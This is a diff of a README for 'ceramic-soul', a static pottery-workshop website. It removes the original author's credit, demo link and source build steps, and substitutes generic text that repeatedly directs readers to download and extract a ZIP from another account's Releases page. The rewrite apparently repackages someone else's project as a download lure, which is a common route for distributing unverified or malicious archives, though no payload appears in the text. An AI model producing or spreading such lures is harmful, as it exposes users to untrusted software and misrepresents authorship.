@@ -1,125 +1,56 @@
-# 🏺 Ceramic Soul
+# 🎨 ceramic-soul - Experience Cozy Handcrafted Pottery Online
 
-![Project Status](https://img.shields.io/badge/Status-Completed-success)
-![License](https://img.shields.io/badge/License-ISC-blue)
+![Download](https://img.shields.io/badge/Download-latest%20release-blue.svg)  
+[![GitHub Releases](https://img.shields.io/github/release/Khawoat2006/ceramic-soul.svg)](https://github.com/Khawoat2006/ceramic-soul/releases)
 
-**Ceramic Soul** is a multi-page website for a pottery workshop and store. It features a modern, responsive design, interactive elements, and a cozy atmosphere dedicated to handcrafted ceramics.
+## 🚀 Getting Started
 
-🔗 **[Live Demo](https://okaymarta.github.io/ceramic-soul/)**
+Welcome to **ceramic-soul**! This is a cozy, multi-page website designed for a handcrafted pottery workshop and store. You can enjoy a smooth experience with our fully responsive layout. Follow these simple steps to download and run the application.
 
----
+## 🌟 Features
 
-## 📸 Preview
+- **User-friendly Design:** Enjoy browsing our pottery collection.
+- **Responsive Layout:** Works well on both mobile and desktop devices.
+- **Lightweight:** Fast loading times for a better experience.
 
-### Home Page & Atmosphere
+## 📥 Download & Install
 
-> _A welcoming landing page with a hero section and workshop details._ > ![Home Page](./screenshots/home-desktop.png)
+To get started, visit this page to download the latest release: [Download Ceramic Soul](https://github.com/Khawoat2006/ceramic-soul/releases).
 
-### Catalog & Tabs
+After you've downloaded the file, follow these steps:
 
-> _Interactive product catalog with category filtering logic._ > ![Catalog](./screenshots/catalog.png)
+1. Locate the downloaded ZIP file on your computer.
+2. Extract the contents of the ZIP file.
+3. Open the extracted folder.
 
-### Mobile Responsiveness
+## 🖥️ Running the Application
 
-> _Fully adaptive navigation and layout for mobile devices._
+You do not need any software installed to run the ceramic-soul website. Simply open the `index.html` file in your web browser. Here's how to do it:
 
-<div style="display: flex; gap: 10px;">
-  <img src="./screenshots/mobile-menu.png" alt="Mobile Menu" width="300">
-  <img src="./screenshots/form.png" alt="Contact Form" width="300">
-</div>
+1. Right-click on `index.html`.
+2. Select "Open with" and choose your preferred web browser (Chrome, Firefox, etc.).
+3. The website will load, and you can start browsing!
 
----
+## 🔧 System Requirements
 
-## 🛠️ Tech Stack
+- **Operating System:** Windows, macOS, or Linux
+- **Browser:** Latest version of Chrome, Firefox, or Safari
+- **Internet Connection:** Optional for offline browsing, required for downloading
 
-This project uses a modern frontend setup focused on performance and maintainability.
+## 📋 Technologies Used
 
--   **Core:** HTML5, SCSS, JavaScript (ES6+ Modules)
--   **Build Tool:** [Vite](https://vitejs.dev/) (Fast and lightweight)
--   **Styling:**
-    -   SCSS (Nested rules, mixins, variables)
-    -   `postcss-pxtorem` (Automatic px-to-rem conversion for accessibility)
-    -   [PureCSS](https://purecss.io/) (Lightweight grid system)
-    -   [Fontello](https://fontello.com/) (Icon fonts)
--   **Libraries:**
-    -   [Swiper.js](https://swiperjs.com/) (Touch-enabled sliders)
-    -   [JustValidate](https://just-validate.dev/) (Client-side form validation)
--   **Optimization:** `vite-plugin-imagemin` (Image compression)
+ceramic-soul is built with several modern web technologies to ensure a smooth experience:
 
----
+- **Vite:** A modern build tool that provides a fast development environment.
+- **SCSS:** A CSS preprocessor that makes styling easier and more organized.
+- **Pure JavaScript:** Offers a lightweight and functional approach to web development.
 
-## ✨ Key Features
+## 👐 Support & Feedback
 
--   **Multi-page Architecture:** Separate pages for Home, Catalog, Blog, and About using Vite's multi-page app configuration.
--   **Interactive Components:**
-    -   **Custom Burger Menu:** Smooth open/close animation blocking body scroll.
-    -   **Tabs System:** JavaScript-based filtering in the Catalog section.
-    -   **Carousels:** Responsive image sliders for the "Works" section.
--   **Form Handling:**
-    -   Real-time validation for Name, Email, and Checkboxes.
-    -   Asynchronous data submission (mocked via `httpbin.org`).
--   **Responsive Design:** Adaptive grid layout (`pure-g`) that looks great on desktops, tablets, and phones.
+If you encounter any issues or have suggestions for improvements, feel free to reach out. You can create an issue on our [GitHub Issues page](https://github.com/Khawoat2006/ceramic-soul/issues).
 
----
+## 🌍 Stay Updated
 
-## 🚀 Installation & Setup
+Stay tuned for updates and new features! Check back to the [Releases page](https://github.com/Khawoat2006/ceramic-soul/releases) for the latest versions and improvements.
 
-If you want to run this project locally:
-
-1.  **Clone the repository**
-
-    ```bash
-    git clone https://github.com/okaymarta/ceramic-soul.git
-    cd ceramic-soul
-    ```
-
-2.  **Install dependencies**
-
-    ```bash
-    npm install
-    ```
-
-3.  **Run development server**
-
-    ```bash
-    npm run dev
-    ```
-
-4.  **Build for production**
-    ```bash
-    npm run build
-    ```
-
----
-
-## 📂 Project Structure
-
-```text
-ceramic_soul/
-├── public/              # Static assets (favicons, manifest)
-├── src/
-│   ├── img/             # Project images (optimized)
-│   ├── js/              # Main scripts (Swiper, logic)
-│   ├── sass/            # Styles (Blocks, UI, Base)
-│   └── font/            # Webfonts
-├── about.html           # About page
-├── blog.html            # Blog page
-├── catalog.html         # Catalog page
-├── index.html           # Main entry point
-├── vite.config.js       # Vite configuration
-└── package.json         # Dependencies
-```
-
----
-
-## 👩‍💻 Author
-
-**Marta Okilka**
-
-Developed with ❤️ for ceramic art.
-
----
-
-## 🎓 About the Project
-
-This project was developed as a capstone assignment for the **WEB-developer** course on the Udemy platform.. It represents my journey from learning the basics to building a fully functional, multi-page website with modern tooling.
+Thank you for choosing **ceramic-soul**. We hope you enjoy your experience with our handcrafted pottery workshop website!
